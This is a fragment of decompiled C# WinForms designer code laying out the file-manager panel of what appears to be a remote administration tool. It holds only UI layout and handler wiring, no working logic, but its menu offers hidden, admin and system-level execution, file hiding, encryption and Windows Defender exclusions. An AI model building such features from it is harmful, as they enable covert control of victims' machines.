		((System.ComponentModel.ISupportInitialize)this.dataGridView1).BeginInit();
		this.panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		this.contextMenuStrip1.SuspendLayout();
		this.panel3.SuspendLayout();
		base.SuspendLayout();
		this.panel1.Controls.Add(this.dataGridView3);
		this.panel1.Controls.Add(this.dataGridView1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Left;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(200, 573);
		this.panel1.TabIndex = 0;
		this.dataGridView3.AllowUserToAddRows = false;
		this.dataGridView3.AllowUserToDeleteRows = false;
		this.dataGridView3.AllowUserToResizeColumns = false;
		this.dataGridView3.AllowUserToResizeRows = false;
		this.dataGridView3.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView3.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView3.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView3.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView3.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.dataGridView3.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView3.Columns.AddRange(this.Column2, this.Column1);
		this.dataGridView3.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView3.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView3.Enabled = false;
		this.dataGridView3.EnableHeadersVisualStyles = false;
		this.dataGridView3.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView3.Location = new System.Drawing.Point(0, 0);
		this.dataGridView3.Name = "dataGridView3";
		this.dataGridView3.ReadOnly = true;
		this.dataGridView3.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView3.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView3.RowHeadersVisible = false;
		this.dataGridView3.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView3.ShowCellErrors = false;
		this.dataGridView3.ShowCellToolTips = false;
		this.dataGridView3.ShowEditingIcon = false;
		this.dataGridView3.ShowRowErrors = false;
		this.dataGridView3.Size = new System.Drawing.Size(200, 404);
		this.dataGridView3.TabIndex = 13;
		this.Column2.HeaderText = "";
		this.Column2.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.Column2.MinimumWidth = 16;
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.Width = 16;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.dataGridView1.AllowUserToAddRows = false;
		this.dataGridView1.AllowUserToDeleteRows = false;
		this.dataGridView1.AllowUserToResizeColumns = false;
		this.dataGridView1.AllowUserToResizeRows = false;
		this.dataGridView1.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView1.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.dataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView1.Columns.AddRange(this.Column3, this.dataGridViewTextBoxColumn1);
		this.dataGridView1.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView1.DefaultCellStyle = dataGridViewCellStyle5;
		this.dataGridView1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.dataGridView1.Enabled = false;
		this.dataGridView1.EnableHeadersVisualStyles = false;
		this.dataGridView1.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView1.Location = new System.Drawing.Point(0, 404);
		this.dataGridView1.Name = "dataGridView1";
		this.dataGridView1.ReadOnly = true;
		this.dataGridView1.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle6;
		this.dataGridView1.RowHeadersVisible = false;
		this.dataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView1.ShowCellErrors = false;
		this.dataGridView1.ShowCellToolTips = false;
		this.dataGridView1.ShowEditingIcon = false;
		this.dataGridView1.ShowRowErrors = false;
		this.dataGridView1.Size = new System.Drawing.Size(200, 169);
		this.dataGridView1.TabIndex = 14;
		this.Column3.HeaderText = "";
		this.Column3.MinimumWidth = 16;
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 16;
		this.dataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.dataGridViewTextBoxColumn1.HeaderText = "";
		this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
		this.dataGridViewTextBoxColumn1.ReadOnly = true;
		this.panel2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.panel2.Controls.Add(this.dataGridView2);
		this.panel2.Controls.Add(this.rjTextBox1);
		this.panel2.Controls.Add(this.panel3);
		this.panel2.Location = new System.Drawing.Point(222, 64);
		this.panel2.Name = "panel2";
		this.panel2.Size = new System.Drawing.Size(575, 573);
		this.panel2.TabIndex = 1;
		this.dataGridView2.AllowDrop = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column4, this.Column6, this.Column7, this.Column5, this.dataGridViewTextBoxColumn2);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle8;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView2.Location = new System.Drawing.Point(0, 31);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle9.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(575, 519);
		this.dataGridView2.TabIndex = 15;
		this.Column4.HeaderText = "";
		this.Column4.MinimumWidth = 16;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column4.Width = 16;
		this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column6.HeaderText = "";
		this.Column6.Name = "Column6";
		this.Column6.ReadOnly = true;
		this.Column6.Width = 5;
		this.Column7.HeaderText = "";
		this.Column7.MinimumWidth = 150;
		this.Column7.Name = "Column7";
		this.Column7.ReadOnly = true;
		this.Column7.Width = 150;
		this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column5.HeaderText = "";
		this.Column5.MinimumWidth = 150;
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.Column5.Width = 150;
		this.dataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.dataGridViewTextBoxColumn2.HeaderText = "";
		this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
		this.dataGridViewTextBoxColumn2.ReadOnly = true;
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.backToolStripMenuItem, this.refreshToolStripMenuItem, this.upDownToolStripMenuItem, this.createFolderToolStripMenuItem, this.zipToolStripMenuItem, this.excuteToolStripMenuItem, this.attributesToolStripMenuItem, this.cryptoToolStripMenuItem, this.defenderToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(181, 224);
		this.backToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("backToolStripMenuItem.Image");
		this.backToolStripMenuItem.Name = "backToolStripMenuItem";
		this.backToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.backToolStripMenuItem.Text = "Back";
		this.backToolStripMenuItem.Click += new System.EventHandler(backToolStripMenuItem_Click);
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.refreshToolStripMenuItem.Text = "Refresh";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.upDownToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.downloadToolStripMenuItem, this.uploadToolStripMenuItem });
		this.upDownToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("upDownToolStripMenuItem.Image");
		this.upDownToolStripMenuItem.Name = "upDownToolStripMenuItem";
		this.upDownToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.upDownToolStripMenuItem.Text = "Up/Down";
		this.downloadToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("downloadToolStripMenuItem.Image");
		this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
		this.downloadToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
		this.downloadToolStripMenuItem.Text = "Download";
		this.downloadToolStripMenuItem.Click += new System.EventHandler(downloadToolStripMenuItem_Click);
		this.uploadToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("uploadToolStripMenuItem.Image");
		this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
		this.uploadToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
		this.uploadToolStripMenuItem.Text = "Upload";
		this.uploadToolStripMenuItem.Click += new System.EventHandler(uploadToolStripMenuItem_Click);
		this.createFolderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.createFileToolStripMenuItem, this.createFolderToolStripMenuItem1, this.renameToolStripMenuItem, this.removeToolStripMenuItem, this.copyToolStripMenuItem, this.cutToolStripMenuItem, this.pasteToolStripMenuItem });
		this.createFolderToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("createFolderToolStripMenuItem.Image");
		this.createFolderToolStripMenuItem.Name = "createFolderToolStripMenuItem";
		this.createFolderToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.createFolderToolStripMenuItem.Text = "Manager";
		this.createFileToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("createFileToolStripMenuItem.Image");
		this.createFileToolStripMenuItem.Name = "createFileToolStripMenuItem";
		this.createFileToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.createFileToolStripMenuItem.Text = "Create File";
		this.createFileToolStripMenuItem.Click += new System.EventHandler(createFileToolStripMenuItem_Click);
		this.createFolderToolStripMenuItem1.Image = (System.Drawing.Image)componentResourceManager.GetObject("createFolderToolStripMenuItem1.Image");
		this.createFolderToolStripMenuItem1.Name = "createFolderToolStripMenuItem1";
		this.createFolderToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.createFolderToolStripMenuItem1.Text = "Create Folder";
		this.createFolderToolStripMenuItem1.Click += new System.EventHandler(createFolderToolStripMenuItem1_Click);
		this.renameToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("renameToolStripMenuItem.Image");
		this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
		this.renameToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.renameToolStripMenuItem.Text = "Rename";
		this.renameToolStripMenuItem.Click += new System.EventHandler(renameToolStripMenuItem_Click);
		this.removeToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("removeToolStripMenuItem.Image");
		this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
		this.removeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.removeToolStripMenuItem.Text = "Remove";
		this.removeToolStripMenuItem.Click += new System.EventHandler(removeToolStripMenuItem_Click);
		this.copyToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("copyToolStripMenuItem.Image");
		this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
		this.copyToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.copyToolStripMenuItem.Text = "Copy";
		this.copyToolStripMenuItem.Click += new System.EventHandler(copyToolStripMenuItem_Click);
		this.cutToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("cutToolStripMenuItem.Image");
		this.cutToolStripMenuItem.Name = "cutToolStripMenuItem";
		this.cutToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.cutToolStripMenuItem.Text = "Cut";
		this.cutToolStripMenuItem.Click += new System.EventHandler(cutToolStripMenuItem_Click);
		this.pasteToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("pasteToolStripMenuItem.Image");
		this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
		this.pasteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.pasteToolStripMenuItem.Text = "Paste";
		this.pasteToolStripMenuItem.Click += new System.EventHandler(pasteToolStripMenuItem_Click);
		this.zipToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.unzipToolStripMenuItem, this.zipToolStripMenuItem1 });
		this.zipToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("zipToolStripMenuItem.Image");
		this.zipToolStripMenuItem.Name = "zipToolStripMenuItem";
		this.zipToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.zipToolStripMenuItem.Text = "Zip";
		this.unzipToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("unzipToolStripMenuItem.Image");
		this.unzipToolStripMenuItem.Name = "unzipToolStripMenuItem";
		this.unzipToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.unzipToolStripMenuItem.Text = "Unzip";
		this.unzipToolStripMenuItem.Click += new System.EventHandler(unzipToolStripMenuItem_Click);
		this.zipToolStripMenuItem1.Image = (System.Drawing.Image)componentResourceManager.GetObject("zipToolStripMenuItem1.Image");
		this.zipToolStripMenuItem1.Name = "zipToolStripMenuItem1";
		this.zipToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.zipToolStripMenuItem1.Text = "Zip";
		this.zipToolStripMenuItem1.Click += new System.EventHandler(zipToolStripMenuItem1_Click);
		this.excuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.excuteToolStripMenuItem1, this.executeToolStripMenuItem, this.executeToolStripMenuItem1, this.executeToolStripMenuItem2, this.audioToolStripMenuItem, this.wallpaperToolStripMenuItem });
		this.excuteToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("excuteToolStripMenuItem.Image");
		this.excuteToolStripMenuItem.Name = "excuteToolStripMenuItem";
		this.excuteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.excuteToolStripMenuItem.Text = "Execute";
		this.excuteToolStripMenuItem1.Image = (System.Drawing.Image)componentResourceManager.GetObject("excuteToolStripMenuItem1.Image");
		this.excuteToolStripMenuItem1.Name = "excuteToolStripMenuItem1";
		this.excuteToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.excuteToolStripMenuItem1.Text = "Execute";
		this.excuteToolStripMenuItem1.Click += new System.EventHandler(excuteToolStripMenuItem1_Click);
		this.executeToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem.Image");
		this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
		this.executeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.executeToolStripMenuItem.Text = "Execute Hidden";
		this.executeToolStripMenuItem.Click += new System.EventHandler(executeToolStripMenuItem_Click);
		this.executeToolStripMenuItem1.Image = (System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem1.Image");
		this.executeToolStripMenuItem1.Name = "executeToolStripMenuItem1";
		this.executeToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.executeToolStripMenuItem1.Text = "Execute Admin";
		this.executeToolStripMenuItem1.Click += new System.EventHandler(executeToolStripMenuItem1_Click);
		this.executeToolStripMenuItem2.Image = (System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem2.Image");
		this.executeToolStripMenuItem2.Name = "executeToolStripMenuItem2";
		this.executeToolStripMenuItem2.Size = new System.Drawing.Size(180, 22);
		this.executeToolStripMenuItem2.Text = "Execute System";
		this.executeToolStripMenuItem2.Click += new System.EventHandler(executeToolStripMenuItem2_Click);
		this.attributesToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.normalToolStripMenuItem, this.hiddenToolStripMenuItem, this.systemToolStripMenuItem, this.directoryToolStripMenuItem, this.lockRemoveToolStripMenuItem, this.unlockRemoveToolStripMenuItem });
		this.attributesToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("attributesToolStripMenuItem.Image");
		this.attributesToolStripMenuItem.Name = "attributesToolStripMenuItem";
		this.attributesToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.attributesToolStripMenuItem.Text = "Attributes";
		this.normalToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("normalToolStripMenuItem.Image");
		this.normalToolStripMenuItem.Name = "normalToolStripMenuItem";
		this.normalToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.normalToolStripMenuItem.Text = "Normal";
		this.normalToolStripMenuItem.Click += new System.EventHandler(normalToolStripMenuItem_Click);
		this.hiddenToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("hiddenToolStripMenuItem.Image");
		this.hiddenToolStripMenuItem.Name = "hiddenToolStripMenuItem";
		this.hiddenToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.hiddenToolStripMenuItem.Text = "Hidden";
		this.hiddenToolStripMenuItem.Click += new System.EventHandler(hiddenToolStripMenuItem_Click);
		this.systemToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("systemToolStripMenuItem.Image");
		this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
		this.systemToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.systemToolStripMenuItem.Text = "System";
		this.systemToolStripMenuItem.Click += new System.EventHandler(systemToolStripMenuItem_Click);
		this.directoryToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("directoryToolStripMenuItem.Image");
		this.directoryToolStripMenuItem.Name = "directoryToolStripMenuItem";
		this.directoryToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.directoryToolStripMenuItem.Text = "Directory";
		this.directoryToolStripMenuItem.Click += new System.EventHandler(directoryToolStripMenuItem_Click);
		this.lockRemoveToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("lockRemoveToolStripMenuItem.Image");
		this.lockRemoveToolStripMenuItem.Name = "lockRemoveToolStripMenuItem";
		this.lockRemoveToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.lockRemoveToolStripMenuItem.Text = "Lock remove";
		this.lockRemoveToolStripMenuItem.Click += new System.EventHandler(lockRemoveToolStripMenuItem_Click);
		this.unlockRemoveToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("unlockRemoveToolStripMenuItem.Image");
		this.unlockRemoveToolStripMenuItem.Name = "unlockRemoveToolStripMenuItem";
		this.unlockRemoveToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.unlockRemoveToolStripMenuItem.Text = "Unlock remove";
		this.unlockRemoveToolStripMenuItem.Click += new System.EventHandler(unlockRemoveToolStripMenuItem_Click);
		this.cryptoToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.encryptToolStripMenuItem, this.decryptToolStripMenuItem });
		this.cryptoToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("cryptoToolStripMenuItem.Image");
		this.cryptoToolStripMenuItem.Name = "cryptoToolStripMenuItem";
		this.cryptoToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.cryptoToolStripMenuItem.Text = "Crypto";
		this.encryptToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("encryptToolStripMenuItem.Image");
		this.encryptToolStripMenuItem.Name = "encryptToolStripMenuItem";
		this.encryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.encryptToolStripMenuItem.Text = "Encrypt";
		this.encryptToolStripMenuItem.Click += new System.EventHandler(encryptToolStripMenuItem_Click);
		this.decryptToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("decryptToolStripMenuItem.Image");
		this.decryptToolStripMenuItem.Name = "decryptToolStripMenuItem";
		this.decryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.decryptToolStripMenuItem.Text = "Decrypt";
		this.decryptToolStripMenuItem.Click += new System.EventHandler(decryptToolStripMenuItem_Click);
		this.defenderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.execlitToolStripMenuItem, this.removeExclusionToolStripMenuItem });
		this.defenderToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("defenderToolStripMenuItem.Image");
		this.defenderToolStripMenuItem.Name = "defenderToolStripMenuItem";
		this.defenderToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.defenderToolStripMenuItem.Text = "Defender";
		this.execlitToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("execlitToolStripMenuItem.Image");
		this.execlitToolStripMenuItem.Name = "execlitToolStripMenuItem";
		this.execlitToolStripMenuItem.Size = new System.Drawing.Size(170, 22);
		this.execlitToolStripMenuItem.Text = "Exclusion";
		this.execlitToolStripMenuItem.Click += new System.EventHandler(execlitToolStripMenuItem_Click);
		this.removeExclusionToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("removeExclusionToolStripMenuItem.Image");
		this.removeExclusionToolStripMenuItem.Name = "removeExclusionToolStripMenuItem";
		this.removeExclusionToolStripMenuItem.Size = new System.Drawing.Size(170, 22);
		this.removeExclusionToolStripMenuItem.Text = "Remove Exclusion";
